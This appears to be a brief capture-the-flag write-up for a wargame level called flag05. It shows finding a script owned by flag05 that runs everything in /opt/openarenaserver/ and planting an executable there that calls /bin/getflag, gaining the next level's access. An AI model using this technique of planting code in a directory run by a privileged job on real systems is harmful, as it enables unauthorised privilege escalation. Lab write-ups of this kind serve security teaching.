# flag05

We find a process getting executed by `flag05`:
```bash
$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
```

It's a bash script that executes whatever it finds in `/opt/openarenaserver/*`.

We can just create a simple script to give us the flag:
```bash
echo "/bin/getflag > /run/shm/flag.txt" > /opt/openarenaserver/wow
chmod +x /opt/openarenaserver/wow
```

and we wait.

We are now given the flag 05 and can login as `level06`.
